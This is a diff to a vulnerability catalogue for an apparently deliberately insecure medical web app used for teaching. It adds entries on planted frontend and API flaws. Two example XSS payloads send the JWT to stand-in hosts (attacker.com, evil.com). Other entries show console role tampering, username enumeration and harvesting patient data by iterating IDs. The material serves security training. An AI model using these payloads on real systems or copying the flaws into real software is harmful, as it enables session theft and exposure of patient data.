@@ -336,13 +336,23 @@ private String password;
 
 ---
 
-**25. User Enumeration — three semantically distinct error messages [A07]**
+**25. User Enumeration — distinct error messages on both register and login [A07]**
 ```java
-// AuthService.java — each message reveals different information to the attacker
+// AuthService.register() — confirms which usernames and emails are already registered
+if (userRepository.existsByUsername(username)) {
+    throw new RuntimeException("Username already taken: " + username);  // username exists
+}
+if (userRepository.existsByEmail(email)) {
+    throw new RuntimeException("Email already registered: " + email);   // email exists
+}
+
+// AuthService.login() — each message reveals different information to the attacker
 throw new RuntimeException("User not found: " + username);         // username does not exist
 throw new RuntimeException("Invalid password");                    // username exists
 throw new RuntimeException("Account is locked until " + time);    // exists + password correct
 ```
+`POST /api/auth/register` returns HTTP 409 with `{"error":"Username already taken: alice"}`.
+An attacker can enumerate all registered usernames by attempting registrations in a loop — no rate limiting, no CAPTCHA, no lockout.
 
 ---
 
@@ -1187,16 +1197,245 @@ A large `GET /api/users` response returning 50 000 records is held in heap twice
 
 ---
 
+## Frontend Vulnerabilities — `mediconnect-frontend` (React 18 + TypeScript + Vite)
+
+> **UI theme**: Dark industrial IoT dashboard — `#0D1117` background, `#2F81F7` electric blue accent,
+> sharp 4 px border-radius, monospace fonts for numeric values, zebra-stripped tables,
+> colored status dots, dense information layout. All vulnerabilities remain unchanged.
+
+---
+
+**76. JWT stored in localStorage [A04 / CWE-922] — `AuthContext.tsx`**
+```typescript
+// [A04] VULNERABLE: storing JWT in localStorage — accessible to any JS on this origin
+localStorage.setItem('token', data.token)
+localStorage.setItem('user', JSON.stringify(data.user))  // includes passwordHash
+```
+Any XSS payload (`<script>`, injected `img onerror`, stored XSS from MessageController) can exfiltrate the JWT with a single `fetch('https://attacker.com/?t=' + localStorage.getItem('token'))`. `httpOnly` cookies would prevent this; localStorage has no browser protection.
+
+---
+
+**77. Client-side JWT decode without signature verification [A04 / CWE-345] — `AuthContext.tsx`**
+```typescript
+function decodeJwtPayload(token: string): Record<string, unknown> {
+  const base64Payload = token.split('.')[1]
+  const json = atob(base64Payload.replace(/-/g, '+').replace(/_/g, '/'))
+  return JSON.parse(json)  // signature (.split('.')[2]) is never checked
+}
+// role field trusted from the decoded payload:
+role: (payload['role'] as string) ?? data.user.role,
+```
+An attacker who intercepts or crafts a token can change `role` to `ADMIN` in the payload. Because the signature is never verified client-side, the frontend grants ADMIN access. The backend's weak JWT secret (30-char static string in `JwtUtil.java`) makes forging signatures trivially easy too.
+
+---
+
+**78. Client-side role-based access control [A01 / CWE-602] — `ProtectedRoute.tsx`**
+```typescript
+// [A04] Role read from locally-decoded JWT payload stored in state —
+// signature was never verified (see AuthContext.tsx decodeJwtPayload)
+const userRole = user?.role ?? ''
+if (userRole !== requiredRole) {
+  return <Navigate to="/dashboard" replace />
+}
+```
+Setting `localStorage.setItem('user', JSON.stringify({...JSON.parse(localStorage.getItem('user')), role: 'ADMIN'}))` in the browser console bypasses every route guard. Backend endpoints (AdminController, etc.) do not consistently enforce role checks either, completing the A01 chain.
+
+---
+
+**79. Full user object (including passwordHash) persisted in localStorage [A02 / CWE-312] — `AuthContext.tsx`**
+```typescript
+// [A04] Full user object (including passwordHash from server) stored in localStorage
+localStorage.setItem('user', JSON.stringify(data.user))
+```
+The backend `UserService.toDto()` intentionally includes `passwordHash` in the response DTO (vulnerability #4). This hash is now stored in plaintext browser storage, readable via `JSON.parse(localStorage.getItem('user')).passwordHash`.
+
+---
+
+**80. Raw server error message rendered directly in UI [A02] — `LoginPage.tsx`**
+```typescript
+// [A02] Raw server error message rendered directly into the DOM
+const message =
+  (err as { response?: { data?: { error?: string } } })?.response?.data?.error ?? 'Login failed'
+setError(message)
+```
+`GlobalExceptionHandler.java` leaks internal exception class names, DB table names, and raw PKs. These strings are forwarded verbatim to the browser and rendered as visible error messages, helping attackers enumerate the system.
+
+---
+
+**81. Token read from localStorage injected into every HTTP request [A04 / A07] — `axiosInstance.ts`**
+```typescript
+// [A04] Insecure Design — token pulled directly from localStorage
+const token = localStorage.getItem('token')
+if (token) {
+  config.headers.Authorization = `Bearer ${token}`
+}
+```
+Axios interceptor reads localStorage synchronously on every request, meaning a token injected by an XSS payload is immediately used for authenticated API calls on behalf of the victim.
+
+---
+
+**82. passwordHash column displayed in admin table [A02] — `DashboardPage.tsx`**
+```typescript
+{/* [A02] passwordHash rendered in plaintext */}
+<td className="py-2 font-mono text-xs break-all">{u.passwordHash ?? '—'}</td>
+```
+The admin dashboard renders every user's MD5 password hash (already crackable offline) directly in the browser DOM. Combined with the `GET /api/admin/users` endpoint having no ADMIN role check (vulnerability #62), any authenticated user can access this view.
+
+---
+
+**83. localStorage JWT visible in Token Inspector widget [A04] — `DashboardPage.tsx`**
+```typescript
+{localStorage.getItem('token') ?? 'No token found'}
+```
+The dashboard intentionally exposes the raw JWT in the UI as a teaching aid, reinforcing that localStorage is fully readable by JavaScript (and thus by any XSS payload on the same origin).
+
+---
+
+**84. dangerouslySetInnerHTML — Stored XSS in message rendering [A05 / CWE-79] — `MessagesPage.tsx`**
+```typescript
+// [A05] VULNERABLE: Stored XSS — message.content rendered as raw HTML
+// Attack: POST /api/messages content: <img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('token'))">
+<div dangerouslySetInnerHTML={{ __html: msg.content }} />
+```
+The message thread renders `content` from the database as raw HTML without sanitization. An attacker who sends a crafted message can execute arbitrary JavaScript in every recipient's browser. Combined with the localStorage JWT storage (vulnerability #76), the XSS payload can immediately exfiltrate the session token. The Compose dialog explicitly invites users to test the payload `<img src=x onerror="alert(1)">`.
+
+---
+
+**85. JWT token embedded as URL query parameter [A04 / CWE-598] — `ProfilePage.tsx`**
+```typescript
+// [A04] VULNERABLE: JWT in URL — visible in browser history, server access logs,
+// CDN logs, and Referer headers when the user navigates away
+const exportPdfUrl = `/api/users/${user?.id}/export?format=pdf&token=${token}`
+window.open(exportPdfUrl, '_blank')
+
+const shareReportUrl = `${window.location.origin}/view-report?patientId=${user?.id}&accessToken=${token}&format=json`
+```
+Two export flows embed the full JWT in URL query parameters. Risks: (1) URL appears in browser history — extractable by any local user; (2) URL sent in `Referer` header to any linked resource on the target page; (3) URL logged verbatim by web servers, load balancers, and CDNs; (4) URL visible to any third-party script on the page via `window.location`. The Profile page displays both URLs to make the vulnerability observable.
+
+---
+
+**86. Admin page accessible to all authenticated users — no role guard [A01 / CWE-285] — `App.tsx` + `AdminPage.tsx`**
+```typescript
+// [A01] ProtectedRoute used WITHOUT requiredRole="ADMIN"
+// Any authenticated user reaches AdminPage
+<Route path="/admin" element={<ProtectedRoute><AdminPage /></ProtectedRoute>} />
+
+// AdminPage loads all users with password hashes for every authenticated caller:
+const { data } = await api.get<User[]>('/admin/users')  // no ADMIN check on backend either
+```
+The `/admin` route uses `ProtectedRoute` without `requiredRole`, so any logged-in user (PATIENT, DOCTOR, etc.) can navigate to the admin panel. The backend `AdminController.getAllUsers()` also has no `@PreAuthorize` annotation. The combination gives any authenticated user: full user list with MD5 password hashes, ability to change any user's role (instant privilege escalation), access to all environment variables including DB password, and ability to destroy the audit trail.
+
+---
+
+**87. Role change via Mass Assignment in Admin UI [A07 / CWE-915] — `AdminPage.tsx`**
+```typescript
+// [A07] Role sent from client-controlled select — backend accepts it verbatim
+api.put(`/users/${id}/role`, { role })  // role is user-selected, e.g. "ADMIN"
+```
+The Admin panel allows any authenticated user to promote any other user (including themselves) to ADMIN by selecting from a dropdown and clicking "Update Role". The backend `UserController.updateRole()` reads `role` directly from the request body without authorization checks.
+
+---
+
+**88. Sender ID spoofing in message compose form [A07 / CWE-284] — `MessagesPage.tsx`**
+```typescript
+// [A07] senderId is an editable numeric field in the compose form
+// Backend MessageService.sendMessage() trusts the body's senderId instead of reading from JWT
+api.post('/messages', { senderId: editableNumber, receiverId: ..., content: ... })
+```
+The compose dialog exposes `senderId` as an editable input field. Any user can set it to any numeric ID to impersonate another user. The backend `MessageService` stores `senderId` from the request body rather than extracting it from the authenticated JWT subject.
+
+---
+
+## Patient Controller — `PatientController`, `PatientService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/PatientController.java` | `GET /api/patients/by-user/{userId}` |
+| `service/PatientService.java` | `findByUserId` — resolves a patient record by user ID |
+
+### Vulnerabilities
+
+**89. IDOR — GET /api/patients/by-user/{userId} exposes full PII without ownership check [A01] — `PatientController.java`**
+```java
+// [A01] No comparison of userId against the authenticated principal from the JWT
+@GetMapping("/by-user/{userId}")
+public ResponseEntity<PatientDto> getByUserId(@PathVariable Long userId) {
+    return patientService.findByUserId(userId)
+            .map(ResponseEntity::ok)
+            .orElse(ResponseEntity.notFound().build());
+}
+```
+Any caller — unauthenticated, DOCTOR, or PHARMACIST — can retrieve the full patient profile of any user:
+- `insuranceNumber` — insurance identifier
+- `dateOfBirth` — date of birth
+- `bloodType` — blood type
+- `allergies` — allergy list
+- `emergencyContact` — emergency contact details
+
+By iterating `userId` values (`/api/patients/by-user/1`, `/2`, `/3`...) an attacker harvests the complete PII dataset for all patients in the system.
+
+---
+
+## Stats Controller — `StatsController`, `StatsService`
+
+### New Files
+
+| File | Description |
+|---|---|
+| `controller/StatsController.java` | `GET /api/stats/summary`, `GET /api/stats/charts` |
+| `service/StatsService.java` | Aggregates counts from all repositories — users by role, appointments by status/month, lab results by status, messages per day |
+
+### Vulnerabilities
+
+**90. Broken Access Control — GET /api/stats/summary with no role check [A01] — `StatsController.java`**
+```java
+// [A01] No @PreAuthorize, no manual role check — combined with SecurityConfig.permitAll()
+//        any unauthenticated caller receives aggregate system statistics
+@GetMapping("/summary")
+public ResponseEntity<Map<String, Object>> summary() {
+    return ResponseEntity.ok(statsService.getSummary());
+}
+```
+A PATIENT, an unauthenticated attacker, or a crawler receives:
+- Total number of registered users split by role (`ADMIN`, `DOCTOR`, `PATIENT`, `LAB_TECH`, `PHARMACIST`)
+- Total appointments and breakdown by status
+- Number of appointments scheduled for today
+- Total lab results and breakdown by status
+- Counts for messages, medical records, and prescriptions
+
+This lets an attacker estimate the scale of the database, confirm how many administrative accounts exist, and monitor appointment load — all without a valid token.
+
+---
+
+**91. Broken Access Control — GET /api/stats/charts with no role check [A01] — `StatsController.java`**
+```java
+// [A01] Same permitAll() exposure as /summary
+@GetMapping("/charts")
+public ResponseEntity<Map<String, Object>> charts() {
+    return ResponseEntity.ok(statsService.getCharts());
+}
+```
+An unauthenticated caller receives:
+- Appointment volume trend for the last 6 months (from `requestedDate` timestamps)
+- Appointment status distribution across all patients
+- Daily message volume for the last 7 days
+
+Message volume patterns reveal peak usage hours; combined with `GET /api/messages/conversation/{userId}` (vulnerability #57), the attacker can time data harvesting requests to periods of low monitoring activity.
+
+---
+
 ## OWASP Category Summary
 
 | ID | Category | Where |
 |---|---|---|
-| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed); `AppointmentController.java` (IDOR); `MedicalRecordController.java` (any doctor for any patient); `LabResultController.java` (IDOR); `MessageController.java` (conversation IDOR, delete without ownership check); `AdminController.java` (admin endpoints open to all callers) |
-| A02 | Cryptographic Failures | `application.yaml`, `V10` (MD5 seed), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client) |
+| A01 | Broken Access Control | `SecurityConfig.java` (`permitAll` on `/api/admin/**`); `UserController.java` (IDOR, mass assignment on role, all users exposed); `AppointmentController.java` (IDOR); `MedicalRecordController.java` (any doctor for any patient); `LabResultController.java` (IDOR); `MessageController.java` (conversation IDOR, delete without ownership check); `AdminController.java` (admin endpoints open to all callers); `PatientController.java` (IDOR — full PII without ownership check #89); `StatsController.java` (aggregate statistics — user counts by role, appointment trends, message volume — exposed without any role check #90 #91); **Frontend**: `ProtectedRoute.tsx` (client-side RBAC bypass #78); `App.tsx` + `AdminPage.tsx` (admin route no role guard #86) |
+| A02 | Cryptographic Failures | `application.yaml`, `V10` (MD5 seed), `JwtUtil.java` (weak key), `SecurityConfig.java` (NoOpPasswordEncoder, no security headers); `MedicalRecordController.java` (filesystem path in response); `AdminController.java` (`GET /config` exposes raw datasource.password and all env vars); `GlobalExceptionHandler.java` (raw exception messages + fully-qualified class names + DB table names forwarded to client); **Frontend**: `AuthContext.tsx` (passwordHash in localStorage #79); `LoginPage.tsx` (raw server error in UI #80); `DashboardPage.tsx` (passwordHash column in admin table #82) |
 | A03 | Injection / File Upload | `MedicalRecordService.java` (unrestricted upload + Path Traversal write via `getOriginalFilename()`; Path Traversal read via `filePath` param); `LabResultService.java` (predictable filename without UUID; Path Traversal read via `filePath` param) |
-| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For) |
-| A05 | Injection / XSS | `SecurityConfig.java` (wildcard CORS, no security headers), `V8` + `Message.java` (Stored XSS); `AppointmentService.java` (SQL injection via `doctorName`); `LabResultService.java` (4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `MessageService.java` (Stored XSS via unsanitized content); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF) |
+| A04 | Insecure Design | `V2` (PII plaintext), `User.java` (passwordHash in response), `PasswordUtils.java` (MD5, timing attack), `AuthController.java` (JWT in body); `UserService.java` (passwordHash in every response); `LoggingInterceptor.java` (password params + response body logged verbatim, spoofable IP from X-Forwarded-For); **Frontend**: `AuthContext.tsx` (JWT + passwordHash in localStorage #76, #79; unverified JWT decode #77); `axiosInstance.ts` (localStorage read on every request #81); `DashboardPage.tsx` (Token Inspector widget #83); `ProfilePage.tsx` (JWT in URL query param on export #85) |
+| A05 | Injection / XSS | `SecurityConfig.java` (wildcard CORS, no security headers), `V8` + `Message.java` (Stored XSS); `AppointmentService.java` (SQL injection via `doctorName`); `LabResultService.java` (4×SQLi: 3 string params + 1 numeric UNION without closing quotes); `MessageService.java` (Stored XSS via unsanitized content); `LoggingInterceptor.java` (Log Injection via unsanitized User-Agent CR/LF); **Frontend**: `MessagesPage.tsx` (`dangerouslySetInnerHTML` Stored XSS #84) |
 | A06 | Security Misconfiguration / Missing Business Logic | `AppointmentService.java` (no state machine on status transitions); `PrescriptionService.java` (double dispensing allowed, any status transition allowed including `CANCELLED → DISPENSED`) |
-| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body); `AdminController.java` (role from body → instant ADMIN creation) |
+| A07 | Auth Failures / Mass Assignment | `JwtUtil.java` (30-day expiry, algorithm confusion), `JwtAuthenticationFilter.java` (skip expiry paths, swallowed exceptions), `AuthService.java` (user enumeration, no rate limiting), `CustomUserDetailsService.java` (user enumeration), all `*Dto.java`; `UserController.java` (`GET /delete/{id}` — delete via GET); `MessageService.java` (sender spoofing); `PrescriptionService.java` (pharmacistId from body); `AdminController.java` (role from body → instant ADMIN creation); **Frontend**: `RegisterPage.tsx` (ADMIN role selectable on signup #frontend); `AdminPage.tsx` (role change Mass Assignment #87); `MessagesPage.tsx` (senderId editable in compose form #88) |
 | A08 | Software and Data Integrity Failures / Resource Exhaustion | `pom.xml` (JJWT CVE-2024-31033), `MedicalRecord.java` (no content_hash); `AppointmentController.java` (PDF without Content-MD5); `MedicalRecordService.java` (no hash computed at upload); `LoggingInterceptor.java` (`ex.printStackTrace(pw)` — full JVM stack trace persisted to DB, CWE-209); `ContentCachingFilter.java` + `application.yaml` (unbounded heap buffering, CWE-400 DoS via single oversized request) |
 | A09 | Security Logging and Monitoring Failures | `AdminController.java` (`POST /logs/clear` permanently deletes entire audit trail without authorization — evidence destruction attack); `LoggingInterceptor.java` (plaintext passwords and JWT tokens stored in audit_logs; logging errors silently swallowed) |
